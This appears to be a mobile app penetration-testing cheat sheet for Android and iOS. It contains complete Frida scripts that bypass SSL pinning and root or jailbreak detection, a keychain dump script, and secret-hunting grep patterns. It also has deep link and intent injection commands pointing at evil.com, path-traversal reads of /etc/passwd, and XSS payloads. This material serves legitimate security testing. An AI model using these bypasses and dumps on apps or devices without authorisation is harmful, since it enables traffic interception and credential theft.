# Mobile Application Penetration Testing

## Setup & Tooling

### Android Tools

```bash
# jadx - DEX to Java decompiler
brew install jadx

# apktool - APK disassembly/reassembly
brew install apktool

# Frida - dynamic instrumentation
pip install frida-tools
# On rooted device/emulator:
adb push frida-server-<version>-android-<arch> /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Objection - Frida-powered runtime exploration
pip install objection

# MobSF - automated static/dynamic analysis
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK/IPA at http://localhost:8000

# ADB setup
brew install android-platform-tools
adb devices
```

### iOS Tools

```bash
# frida-ios-dump - decrypted IPA extraction
pip install frida-tools
git clone https://github.com/AloneMonkey/frida-ios-dump
cd frida-ios-dump && pip install -r requirements.txt

# ipatool - App Store IPA download
brew install ipatool
ipatool auth login -e user@example.com

# class-dump (for non-arm64e)
brew install class-dump

# objection for iOS
pip install objection
```

### Burp Suite Proxy + Cert Install

```bash
# Export Burp CA cert (DER format) from Proxy > Options > Import/Export CA Certificate

# Android cert install (system-level, requires root)
openssl x509 -inform DER -in cacert.der -out cacert.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
cp cacert.pem ${HASH}.0
adb root
adb remount
adb push ${HASH}.0 /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/${HASH}.0"
adb reboot

# Android proxy config
adb shell settings put global http_proxy 192.168.1.X:8080

# iOS cert install
# Settings > General > Profile > Install Burp CA
# Settings > General > About > Certificate Trust Settings > Enable Full Trust
```

---

## Android Testing

### APK Extraction

```bash
# List installed packages
adb shell pm list packages | grep -i <keyword>

# Find APK path
adb shell pm path com.target.app

# Pull APK
adb pull /data/app/com.target.app-1/base.apk ./target.apk

# Pull split APKs (if applicable)
adb shell pm path com.target.app | while read -r line; do
  adb pull "$(echo $line | cut -d: -f2)"
done

# Extract from device (alternative)
adb shell cmd package dump com.target.app | grep -i "codePath"
```

### Decompilation & Static Analysis

```bash
# jadx - decompile to Java source
jadx -d output_dir target.apk
jadx-gui target.apk  # GUI mode

# apktool - disassemble to smali + resources
apktool d target.apk -o target_apktool/
# Outputs: AndroidManifest.xml, smali/, res/, assets/

# dex2jar alternative
d2j-dex2jar target.apk -o target.jar
jd-gui target.jar
```

### AndroidManifest.xml Analysis

```bash
# Extract and review manifest
apktool d target.apk -o target_dir/
cat target_dir/AndroidManifest.xml
```

Key checks:

```bash
# Debuggable flag (CRITICAL if true in production)
grep -i "android:debuggable" AndroidManifest.xml

# Backup flag (data extraction via adb backup)
grep -i "android:allowBackup" AndroidManifest.xml

# Exported components (accessible to other apps)
grep -i "android:exported=\"true\"" AndroidManifest.xml

# Exported activities
grep -B2 -A5 "android:exported=\"true\"" AndroidManifest.xml | grep -i "activity"

# Exported services
grep -B2 -A5 "android:exported=\"true\"" AndroidManifest.xml | grep -i "service"

# Exported broadcast receivers
grep -B2 -A5 "android:exported=\"true\"" AndroidManifest.xml | grep -i "receiver"

# Content providers
grep -B2 -A10 "<provider" AndroidManifest.xml

# Custom permissions (look for signature vs dangerous)
grep -i "android:permission" AndroidManifest.xml
grep -i "android:protectionLevel" AndroidManifest.xml

# Network security config
grep -i "networkSecurityConfig" AndroidManifest.xml
cat target_dir/res/xml/network_security_config.xml
```

### Hardcoded Secrets

```bash
# Run against jadx output directory
cd output_dir/sources/

# API keys and tokens
grep -rn "api[_-]key\|apikey\|api_secret" --include="*.java"
grep -rn "AIza[0-9A-Za-z_-]{35}" --include="*.java"  # Google API key
grep -rn "AKIA[0-9A-Z]{16}" --include="*.java"        # AWS Access Key
grep -rn "sk_live_[0-9a-zA-Z]{24}" --include="*.java" # Stripe secret
grep -rn "ghp_[0-9a-zA-Z]{36}" --include="*.java"     # GitHub PAT

# Firebase/cloud URLs
grep -rn "firebaseio\.com\|googleapis\.com" --include="*.java"
grep -rn "https://.*\.cloudfunctions\.net" --include="*.java"

# Hardcoded credentials
grep -rn "password\|passwd\|secret\|token" --include="*.java" | grep -i "=\s*\""
grep -rn "jdbc:\|mongodb://\|redis://" --include="*.java"

# Private keys / certs in assets
find . -name "*.pem" -o -name "*.p12" -o -name "*.bks" -o -name "*.keystore"
grep -rn "BEGIN RSA PRIVATE KEY\|BEGIN PRIVATE KEY" .

# Strings in resources
grep -rn "api\|key\|secret\|password\|token" target_dir/res/values/strings.xml

# SharedPreferences defaults
grep -rn "getSharedPreferences\|putString\|getString" --include="*.java" | grep -i "key\|token\|pass"

# Base64 encoded secrets
grep -rn "[A-Za-z0-9+/]{40,}={0,2}" --include="*.java" | head -20
```

### Certificate Pinning Bypass (Frida)

```javascript
// ssl_pinning_bypass.js - Universal SSL pinning bypass
Java.perform(function() {
    // TrustManager bypass
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
        console.log('[+] Bypassing TrustManagerImpl: ' + host);
        return untrustedChain;
    };

    // OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log('[+] Bypassing OkHttp3 pinning: ' + hostname);
            return;
        };
    } catch(e) { console.log('OkHttp3 not found'); }

    // Retrofit/OkHttp CertificatePinner (older)
    try {
        var CertPinner = Java.use('com.squareup.okhttp.CertificatePinner');
        CertPinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function(hostname, chain) {
            console.log('[+] Bypassing OkHttp pinning: ' + hostname);
            return;
        };
    } catch(e) {}

    // WebViewClient SSL error bypass
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            console.log('[+] Bypassing WebView SSL error');
            handler.proceed();
        };
    } catch(e) {}

    // Network security config TrustManager
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var TrustManager = Java.registerClass({
            name: 'com.bypass.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
    } catch(e) {}
});
```

```bash
# Run the bypass
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# Using objection (automated)
objection -g com.target.app explore
# Inside objection:
android sslpinning disable

# Frida codeshare scripts
frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f com.target.app
```

### Root Detection Bypass (Frida)

```javascript
// root_bypass.js - Comprehensive Android root detection bypass
Java.perform(function() {
    // 1. File.exists() - block su/Magisk path checks
    var File = Java.use('java.io.File');
    var rootPaths = [
        '/system/app/Superuser.apk', '/sbin/su', '/system/bin/su',
        '/system/xbin/su', '/data/local/xbin/su', '/data/local/bin/su',
        '/system/sd/xbin/su', '/system/bin/failsafe/su', '/data/local/su',
        '/su/bin/su', '/su/bin', '/system/xbin/daemonsu',
        '/system/app/Superuser', '/system/etc/.installed_su_daemon',
        // Magisk paths
        '/sbin/.magisk', '/data/adb/magisk', '/data/adb/modules',
        '/system/xbin/magisk', '/cache/.disable_magisk',
        // Common root indicators
        '/system/xbin/busybox', '/system/bin/busybox',
        '/data/data/com.topjohnwu.magisk', '/data/data/eu.chainfire.supersu'
    ];

    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        for (var i = 0; i < rootPaths.length; i++) {
            if (path === rootPaths[i]) {
                console.log('[Root Bypass] Hiding path: ' + path);
                return false;
            }
        }
        return this.exists();
    };

    // 2. Runtime.exec() - block "which su", "su", "id" commands
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmdArray) {
        var cmd = cmdArray.join(' ');
        if (cmd.indexOf('su') !== -1 || cmd.indexOf('which') !== -1 ||
            cmd.indexOf('magisk') !== -1) {
            console.log('[Root Bypass] Blocked exec: ' + cmd);
            throw Java.use('java.io.IOException').$new('Permission denied');
        }
        return this.exec(cmdArray);
    };
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') !== -1 || cmd.indexOf('which') !== -1 ||
            cmd.indexOf('magisk') !== -1) {
            console.log('[Root Bypass] Blocked exec: ' + cmd);
            throw Java.use('java.io.IOException').$new('Permission denied');
        }
        return this.exec(cmd);
    };

    // 3. System.getProperty - hide ro.debuggable, ro.secure
    var System = Java.use('java.lang.System');
    System.getProperty.overload('java.lang.String').implementation = function(key) {
        if (key === 'ro.debuggable') { return '0'; }
        if (key === 'ro.secure') { return '1'; }
        if (key === 'ro.build.selinux') { return '1'; }
        if (key === 'ro.build.tags' && this.getProperty(key) === 'test-keys') {
            console.log('[Root Bypass] Hiding test-keys');
            return 'release-keys';
        }
        return this.getProperty(key);
    };

    // 4. PackageManager - hide root/Magisk packages
    var PM = Java.use('android.app.ApplicationPackageManager');
    var rootPackages = [
        'com.topjohnwu.magisk', 'eu.chainfire.supersu',
        'com.koushikdutta.superuser', 'com.thirdparty.superuser',
        'com.noshufou.android.su', 'com.yellowes.su',
        'com.devadvance.rootcloak', 'de.robv.android.xposed.installer',
        'com.saurik.substrate', 'com.zachspong.temprootremovejb',
        'com.ramdroid.appquarantine', 'com.amphoras.hidemyroot'
    ];

    PM.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
        for (var i = 0; i < rootPackages.length; i++) {
            if (pkg === rootPackages[i]) {
                console.log('[Root Bypass] Hiding package: ' + pkg);
                throw Java.use('android.content.pm.PackageManager$NameNotFoundException').$new(pkg);
            }
        }
        return this.getPackageInfo(pkg, flags);
    };

    // 5. Build.TAGS - hide test-keys
    var Build = Java.use('android.os.Build');
    var tags = Build.TAGS.value;
    if (tags && tags.indexOf('test-keys') !== -1) {
        Build.TAGS.value = 'release-keys';
        console.log('[Root Bypass] Build.TAGS patched to release-keys');
    }

    // 6. Settings.Secure - hide ADB enabled
    try {
        var Settings = Java.use('android.provider.Settings$Secure');
        Settings.getInt.overload('android.content.ContentResolver', 'java.lang.String', 'int').implementation = function(cr, name, def) {
            if (name === 'adb_enabled') {
                console.log('[Root Bypass] Hiding ADB enabled');
                return 0;
            }
            return this.getInt(cr, name, def);
        };
    } catch(e) {}

    console.log('[+] Root detection bypass loaded - all checks hooked');
});
```

```javascript
// ios_jailbreak_bypass.js - Comprehensive iOS jailbreak detection bypass
if (ObjC.available) {
    // 1. NSFileManager - hide jailbreak paths
    var jbPaths = [
        '/Applications/Cydia.app', '/Applications/Sileo.app',
        '/Applications/Zebra.app', '/Applications/Installer.app',
        '/Library/MobileSubstrate/MobileSubstrate.dylib',
        '/bin/bash', '/usr/sbin/sshd', '/usr/bin/ssh',
        '/etc/apt', '/var/lib/apt', '/var/lib/cydia',
        '/var/cache/apt', '/var/log/syslog',
        '/private/var/lib/apt', '/private/var/stash',
        '/private/var/tmp/cydia.log',
        '/usr/libexec/sftp-server', '/usr/bin/cycript',
        '/usr/local/bin/cycript', '/usr/lib/libcycript.dylib',
        '/var/mobile/Library/SBSettings/Themes',
        '/Library/MobileSubstrate/DynamicLibraries',
        '/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist',
        '/private/var/mobile/Library/SBSettings/Themes',
        '/jb/offsets.plist', '/.installed_unc0ver',
        '/.bootstrapped_electra', '/usr/lib/libjailbreak.dylib',
        '/var/binpack', '/var/checkra1n.dmg'
    ];

    // Hook NSFileManager fileExistsAtPath:
    var NSFileManager = ObjC.classes.NSFileManager;
    Interceptor.attach(NSFileManager['- fileExistsAtPath:'].implementation, {
        onEnter: function(args) {
            this.path = ObjC.Object(args[2]).toString();
        },
        onLeave: function(retval) {
            for (var i = 0; i < jbPaths.length; i++) {
                if (this.path === jbPaths[i]) {
                    console.log('[JB Bypass] Hiding path: ' + this.path);
                    retval.replace(0);
                    return;
                }
            }
        }
    });

    // 2. Block fork() - some apps detect jailbreak via fork success
    var fork = Module.findExportByName(null, 'fork');
    if (fork) {
        Interceptor.attach(fork, {
            onLeave: function(retval) {
                console.log('[JB Bypass] fork() blocked, returning -1');
                retval.replace(-1);
            }
        });
    }

    // 3. Block canOpenURL for cydia://
    Interceptor.attach(ObjC.classes.UIApplication['- canOpenURL:'].implementation, {
        onEnter: function(args) {
            this.url = ObjC.Object(args[2]).toString();
        },
        onLeave: function(retval) {
            if (this.url.indexOf('cydia') !== -1 || this.url.indexOf('sileo') !== -1 ||
                this.url.indexOf('zbra') !== -1 || this.url.indexOf('filza') !== -1) {
                console.log('[JB Bypass] Blocking canOpenURL: ' + this.url);
                retval.replace(0);
            }
        }
    });

    // 4. Block access() and stat() for jailbreak paths
    var access = Module.findExportByName(null, 'access');
    if (access) {
        Interceptor.attach(access, {
            onEnter: function(args) {
                this.path = args[0].readUtf8String();
            },
            onLeave: function(retval) {
                if (this.path) {
                    for (var i = 0; i < jbPaths.length; i++) {
                        if (this.path === jbPaths[i]) {
                            console.log('[JB Bypass] access() denied: ' + this.path);
                            retval.replace(-1);
                            return;
                        }
                    }
                }
            }
        });
    }

    // 5. Block dyld image checks (detect Substrate/Substitute)
    var _dyld_image_count = Module.findExportByName(null, '_dyld_image_count');
    var _dyld_get_image_name = Module.findExportByName(null, '_dyld_get_image_name');
    if (_dyld_get_image_name) {
        Interceptor.attach(_dyld_get_image_name, {
            onLeave: function(retval) {
                var name = retval.readUtf8String();
                if (name && (name.indexOf('substrate') !== -1 ||
                    name.indexOf('substitute') !== -1 ||
                    name.indexOf('frida') !== -1 ||
                    name.indexOf('cycript') !== -1)) {
                    console.log('[JB Bypass] Hiding dylib: ' + name);
                    retval.replace(Memory.allocUtf8String('/usr/lib/libSystem.B.dylib'));
                }
            }
        });
    }

    // 6. Block sandbox escape check (writing to /)
    var fopen = Module.findExportByName(null, 'fopen');
    if (fopen) {
        Interceptor.attach(fopen, {
            onEnter: function(args) {
                this.path = args[0].readUtf8String();
                this.mode = args[1].readUtf8String();
            },
            onLeave: function(retval) {
                if (this.path && this.mode && this.mode.indexOf('w') !== -1) {
                    if (this.path === '/private/jailbreak_test' ||
                        this.path.indexOf('/private/') === 0 && this.path.indexOf('jb') !== -1) {
                        console.log('[JB Bypass] Blocking write test: ' + this.path);
                        retval.replace(ptr(0));
                    }
                }
            }
        });
    }

    console.log('[+] iOS jailbreak detection bypass loaded');
}
```

```bash
# Run root detection bypass
frida -U -f com.target.app -l root_bypass.js --no-pause

# Run jailbreak detection bypass
frida -U -f com.target.app -l ios_jailbreak_bypass.js --no-pause

# Combined: root + SSL pinning bypass
frida -U -f com.target.app -l root_bypass.js -l ssl_pinning_bypass.js --no-pause

# Using objection (simpler but less comprehensive)
objection -g com.target.app explore
android root disable
android sslpinning disable

# For iOS:
objection -g com.target.app explore
ios jailbreak disable
ios sslpinning disable

# If app detects Frida itself (anti-instrumentation):
# Use frida-server renamed binary + magisk hide
# Or use Gadget injection into patched APK instead of frida-server
```

### Deep Link Injection

```bash
# Find deep links in manifest
grep -A5 "android.intent.action.VIEW" AndroidManifest.xml
grep -i "scheme\|host\|pathPrefix\|pathPattern" AndroidManifest.xml

# Test deep links via adb
adb shell am start -a android.intent.action.VIEW -d "scheme://host/path?param=value" com.target.app

# Fuzz deep link parameters
adb shell am start -a android.intent.action.VIEW -d "myapp://auth/callback?token=INJECTED&redirect=http://evil.com"
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=http://evil.com"
adb shell am start -a android.intent.action.VIEW -d "myapp://deeplink?next=javascript://alert(1)"

# Test with extras
adb shell am start -a android.intent.action.VIEW -d "myapp://transfer" --es "amount" "99999" --es "to_account" "attacker"

# Enumerate all registered schemes
adb shell dumpsys package com.target.app | grep -A10 "intent-filter"
```

### WebView Attacks

```bash
# Search for vulnerable WebView configurations in jadx output
grep -rn "setJavaScriptEnabled(true)" --include="*.java"
grep -rn "addJavascriptInterface" --include="*.java"
grep -rn "setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs" --include="*.java"
grep -rn "loadUrl\|loadData\|evaluateJavascript" --include="*.java"
grep -rn "shouldOverrideUrlLoading" --include="*.java"
```

```javascript
// Frida: Hook WebView to inject JS
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('[WebView] loadUrl: ' + url);
        this.loadUrl(url);
    };

    // Dump JavascriptInterface methods
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log('[WebView] JS Interface: ' + name + ' -> ' + obj.getClass().getName());
        var methods = obj.getClass().getMethods();
        for (var i = 0; i < methods.length; i++) {
            if (methods[i].isAnnotationPresent(Java.use('android.webkit.JavascriptInterface').class)) {
                console.log('  @JavascriptInterface: ' + methods[i].getName());
            }
        }
        this.addJavascriptInterface(obj, name);
    };
});
```

Exploitation vectors:
- `file://` access: If `setAllowFileAccessFromFileURLs(true)`, read local files via XHR from file:// context
- JavaScript interface: Call exposed Java methods from injected JS (`window.interfaceName.methodName()`)
- URL loading: If WebView loads user-controlled URLs, inject `javascript:` or `file:///data/data/com.target.app/...`

### Intent Injection

```bash
# Start exported activities
adb shell am start -n com.target.app/.ExportedActivity
adb shell am start -n com.target.app/.ExportedActivity --es "url" "http://evil.com"
adb shell am start -n com.target.app/.InternalActivity  # test non-exported too

# Send broadcasts to exported receivers
adb shell am broadcast -a com.target.app.ACTION_NAME --es "data" "injected"

# Start exported services
adb shell am startservice -n com.target.app/.ExportedService --es "cmd" "dump_data"

# Query content providers
adb shell content query --uri content://com.target.app.provider/users
adb shell content query --uri content://com.target.app.provider/users --where "_id=1"
adb shell content read --uri content://com.target.app.provider/files/../../etc/passwd

# Drozer (comprehensive component testing)
drozer console connect
run app.package.attacksurface com.target.app
run app.activity.info -a com.target.app
run app.activity.start --component com.target.app com.target.app.ExportedActivity
run app.provider.query content://com.target.app.provider/
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
```

### Data Storage Analysis

```bash
# SharedPreferences (plaintext XML)
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml"
# Or with root:
adb shell "cat /data/data/com.target.app/shared_prefs/*.xml"

# SQLite databases
adb shell "run-as com.target.app ls /data/data/com.target.app/databases/"
adb pull /data/data/com.target.app/databases/app.db
sqlite3 app.db ".tables"
sqlite3 app.db "SELECT * FROM users;"

# Check for sensitive data in logs
adb logcat | grep -i "token\|password\|key\|secret"

# Backup extraction (if allowBackup=true)
adb backup -f backup.ab com.target.app
java -jar abe.jar unpack backup.ab backup.tar
tar xf backup.tar
```

---

## iOS Testing

### IPA Extraction

```bash
# From jailbroken device using frida-ios-dump (decrypted)
cd frida-ios-dump/
python dump.py com.target.app
# Outputs: com.target.app.ipa

# Using ipatool (encrypted, from App Store)
ipatool download -b com.target.app -o target.ipa

# Manual from device (jailbroken)
ssh root@<device_ip> "find /var/containers/Bundle/Application -name '*.app' | grep -i target"
scp -r root@<device_ip>:/var/containers/Bundle/Application/<UUID>/Target.app ./

# Unzip IPA for analysis
unzip target.ipa -d target_ipa/
ls target_ipa/Payload/*.app/
```

### Binary Analysis

```bash
# class-dump - extract Objective-C headers
class-dump target_ipa/Payload/Target.app/Target > headers.h
class-dump -H target_ipa/Payload/Target.app/Target -o headers/

# For Swift/arm64e (use dsdump or swift-demangle)
dsdump --objc target_ipa/Payload/Target.app/Target

# Check binary protections
otool -hv target_ipa/Payload/Target.app/Target  # PIE check
otool -Iv target_ipa/Payload/Target.app/Target | grep -i "_stack_chk"  # Stack canary
codesign -dvvv target_ipa/Payload/Target.app/Target  # Entitlements

# Strings analysis
strings target_ipa/Payload/Target.app/Target | grep -i "api\|key\|secret\|http\|password\|token"

# Check for embedded frameworks
ls target_ipa/Payload/Target.app/Frameworks/
```

### Keychain Dumping

```bash
# Using objection (jailbroken device)
objection -g com.target.app explore
ios keychain dump
ios keychain dump --json

# Using Frida script
frida -U -f com.target.app -l keychain_dump.js

# Using keychain-dumper (jailbroken)
/usr/bin/keychain-dumper -a  # Dump all accessible items

# Check keychain access groups
cat target_ipa/Payload/Target.app/embedded.mobileprovision | security cms -D | grep -A5 "keychain-access-groups"
```

```javascript
// keychain_dump.js
ObjC.perform(function() {
    var query = ObjC.classes.NSMutableDictionary.alloc().init();
    query.setObject_forKey_(ObjC.classes.__NSCFBoolean.numberWithBool_(true), "r_Attributes");
    query.setObject_forKey_(ObjC.classes.__NSCFBoolean.numberWithBool_(true), "r_Data");
    query.setObject_forKey_("m_LimitAll", "m_Limit");

    var classes = ["genp", "inet", "cert", "keys"];
    classes.forEach(function(secClass) {
        query.setObject_forKey_(secClass, "class");
        var result = new ObjC.Object(ptr(0));
        var status = ObjC.classes.SecItemCopyMatching(query, result);
        if (status == 0) {
            console.log("[Keychain] Class: " + secClass);
            console.log(result.toString());
        }
    });
});
```

### URL Scheme Fuzzing

```bash
# Find registered URL schemes
cat target_ipa/Payload/Target.app/Info.plist | grep -A10 "CFBundleURLSchemes"
plutil -p target_ipa/Payload/Target.app/Info.plist | grep -A5 "CFBundleURLSchemes"

# Test URL schemes on device
# From Safari or via Frida:
frida -U -f com.target.app --eval 'ObjC.classes.UIApplication.sharedApplication().openURL_(ObjC.classes.NSURL.URLWithString_("targetapp://auth?token=INJECTED"))'

# Using idb or objection
objection -g com.target.app explore
ios bundles list_frameworks

# Fuzz URL scheme parameters
for payload in "javascript:alert(1)" "file:///etc/passwd" "http://evil.com" "../../../etc/passwd"; do
  echo "Testing: targetapp://callback?url=$payload"
  # Trigger via Frida or on-device
done

# Check for universal links
cat target_ipa/Payload/Target.app/apple-app-site-association
cat target_ipa/Payload/Target.app/.well-known/apple-app-site-association
```

### App Transport Security (ATS) Exceptions

```bash
# Check Info.plist for ATS exceptions
plutil -p target_ipa/Payload/Target.app/Info.plist | grep -A20 "NSAppTransportSecurity"

# Critical findings:
# NSAllowsArbitraryLoads = true  -> All HTTP allowed (HIGH)
# NSExceptionAllowsInsecureHTTPLoads = true -> HTTP for specific domain
# NSExceptionMinimumTLSVersion = "TLSv1.0" -> Weak TLS
# NSExceptionRequiresForwardSecrecy = false -> No PFS required

# Extract full plist as XML
plutil -convert xml1 target_ipa/Payload/Target.app/Info.plist -o Info_readable.plist
cat Info_readable.plist | grep -B2 -A15 "NSAppTransportSecurity"
```

### iOS SSL Pinning Bypass

```javascript
// ios_pinning_bypass.js
if (ObjC.available) {
    // NSURLSession delegate bypass
    var resolver = new ApiResolver('objc');
    resolver.enumerateMatches('*[* URLSession:didReceiveChallenge:completionHandler:]', {
        onMatch: function(match) {
            Interceptor.attach(match.address, {
                onEnter: function(args) {
                    var dominated = new ObjC.Object(args[4]);
                    var dominated_handle = dominated.handle;
                    var NSURLSessionAuthChallengeUseCredential = 0;
                    var completionHandler = new ObjC.Block(args[5]);
                    completionHandler.implementation = function(disposition, credential) {
                        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
                    };
                }
            });
        },
        onComplete: function() {}
    });

    // TrustKit bypass
    try {
        var TrustKit = ObjC.classes.TSKPinningValidator;
        Interceptor.attach(TrustKit['- evaluateTrust:forHostname:'].implementation, {
            onLeave: function(retval) {
                retval.replace(0); // TSKTrustDecisionShouldAllowConnection
            }
        });
    } catch(e) {}

    console.log('[+] iOS SSL pinning bypass loaded');
}
```

```bash
# Run iOS pinning bypass
frida -U -f com.target.app -l ios_pinning_bypass.js --no-pause

# Objection automated bypass
objection -g com.target.app explore
ios sslpinning disable
```

### iOS Data Storage

```bash
# Application data directory (jailbroken)
ssh root@<device_ip>
find /var/mobile/Containers/Data/Application -name "com.target.app" 2>/dev/null
# Or find by app name in container metadata

# Check for sensitive data in:
# - NSUserDefaults (plist files)
find /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/ -name "*.plist"
plutil -p *.plist | grep -i "token\|key\|password\|secret"

# - SQLite databases
find /var/mobile/Containers/Data/Application/<UUID>/ -name "*.sqlite" -o -name "*.db"
sqlite3 app.db ".tables"

# - Cache/tmp files
ls /var/mobile/Containers/Data/Application/<UUID>/Library/Caches/
ls /var/mobile/Containers/Data/Application/<UUID>/tmp/

# - Cookies
cat /var/mobile/Containers/Data/Application/<UUID>/Library/Cookies/Cookies.binarycookies
```

---

## API Testing

### Proxy Configuration

```bash
# Android emulator proxy
emulator -avd <avd_name> -http-proxy http://127.0.0.1:8080

# Android device proxy (WiFi settings or global)
adb shell settings put global http_proxy 192.168.1.X:8080
# Remove proxy:
adb shell settings put global http_proxy :0

# iOS proxy
# Settings > WiFi > (i) > Configure Proxy > Manual > 192.168.1.X:8080

# Invisible proxy (for apps ignoring system proxy)
# On Burp: Proxy > Options > Add listener on all interfaces, enable "Support invisible proxying"
# Route traffic via iptables (Android root):
adb shell iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 192.168.1.X:8080
adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 192.168.1.X:8080
```

### Certificate Pinning Bypass (API Interception)

```bash
# Combined approach for stubborn apps:
# 1. Frida script (see above)
# 2. Patch APK network security config

# Create network_security_config.xml allowing user CAs:
cat > network_security_config.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
EOF

# Rebuild APK with modified config
apktool d target.apk -o target_mod/
cp network_security_config.xml target_mod/res/xml/
# Add android:networkSecurityConfig="@xml/network_security_config" to manifest <application>
apktool b target_mod/ -o target_patched.apk
# Sign the APK
keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000
apksigner sign --ks test.keystore target_patched.apk
adb install target_patched.apk
```

### Token Storage Analysis

```bash
# === Android: SharedPreferences (INSECURE) ===
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml" | grep -i "token\|session\|auth\|jwt"
# Finding: Tokens in SharedPreferences = plaintext XML on disk

# === Android: Keystore (SECURE) ===
# Check if app uses Android Keystore
grep -rn "KeyStore\|AndroidKeyStore\|KeyGenerator" --include="*.java" jadx_output/
grep -rn "setUserAuthenticationRequired\|setKeyValidityDuration" --include="*.java" jadx_output/
# Keystore-backed keys cannot be extracted even with root

# === Android: EncryptedSharedPreferences ===
grep -rn "EncryptedSharedPreferences\|MasterKey" --include="*.java" jadx_output/

# === iOS: Keychain (SECURE if configured correctly) ===
objection -g com.target.app explore
ios keychain dump
# Check kSecAttrAccessible values:
# kSecAttrAccessibleAlways = INSECURE (accessible even when locked)
# kSecAttrAccessibleWhenUnlocked = Better
# kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly = Best

# === iOS: NSUserDefaults (INSECURE) ===
objection -g com.target.app explore
ios nsuserdefaults get
# Finding: Tokens in NSUserDefaults = plaintext plist on disk

# === Token Analysis Checklist ===
# 1. Where is the token stored? (SharedPrefs/NSUserDefaults = bad, Keystore/Keychain = good)
# 2. Is the token encrypted at rest?
# 3. Does the token expire? (Check JWT exp claim)
# 4. Is refresh token rotation implemented?
# 5. Is biometric/PIN required to access token?
```

### API Endpoint Testing

```bash
# Extract API endpoints from decompiled source
grep -rn "https://\|http://" --include="*.java" jadx_output/ | grep -v "google\|facebook\|crashlytics" | sort -u
grep -rn "\"\/api\/\|\"\/v[0-9]\/" --include="*.java" jadx_output/

# Common API issues to test:
# - BOLA/IDOR: Change user IDs in requests
# - Missing auth: Remove Authorization header
# - JWT manipulation: Decode, modify, re-sign with none algorithm
# - Rate limiting: Replay OTP/auth requests
# - Mass assignment: Add admin=true, role=admin to registration/update
# - Verbose errors: Trigger errors for stack traces
```

---

## Common Findings

**Critical**
- Hardcoded API keys/secrets in source code
- Debuggable flag enabled in production (android:debuggable="true")
- Authentication tokens stored in plaintext (SharedPreferences/NSUserDefaults)
- SQL injection in content providers
- JavaScript interface exposed in WebView with file:// access
- Hardcoded credentials (username/password in source)

**High**
- Certificate pinning not implemented (allows traffic interception)
- Exported activities/services with sensitive functionality
- Backup enabled (android:allowBackup="true") with sensitive data
- Weak/missing encryption for local data storage
- Deep links accepting arbitrary URLs (open redirect / XSS)
- NSAllowsArbitraryLoads=true (ATS disabled globally)
- Keychain items with kSecAttrAccessibleAlways

**Medium**
- Sensitive data in application logs (adb logcat)
- Clipboard data exposure (passwords copied to clipboard)
- Screenshot/screen recording not disabled for sensitive screens
- Weak TLS configuration (TLS 1.0/1.1 allowed)
- Missing root/jailbreak detection
- URL schemes without input validation
- Excessive app permissions

**Low**
- Missing certificate pinning on non-sensitive endpoints
- Application data in device backups (non-sensitive)
- Missing code obfuscation (ProGuard/R8 not applied)
- Informational headers leaked in API responses
- Third-party SDK data collection without disclosure

---

## Quick Reference Commands

```bash
# Full Android static analysis pipeline
apktool d target.apk -o apktool_out/ && jadx -d jadx_out/ target.apk
grep -rn "api_key\|secret\|password\|token" jadx_out/sources/ | grep -v "\.class"
grep "debuggable\|allowBackup\|exported" apktool_out/AndroidManifest.xml

# Full iOS static analysis pipeline
unzip target.ipa -d ipa_out/
class-dump ipa_out/Payload/*.app/* > headers.h
strings ipa_out/Payload/*.app/* | grep -iE "api|key|secret|http|password|token"
plutil -p ipa_out/Payload/*.app/Info.plist | grep -A20 "NSAppTransportSecurity"

# Runtime testing (both platforms)
objection -g com.target.app explore  # or bundle ID for iOS
# Then inside objection:
env                              # Show app paths
android sslpinning disable      # or: ios sslpinning disable
android root disable            # or: ios jailbreak disable
android hooking list classes    # Enumerate classes
android hooking list class_methods <class>
```
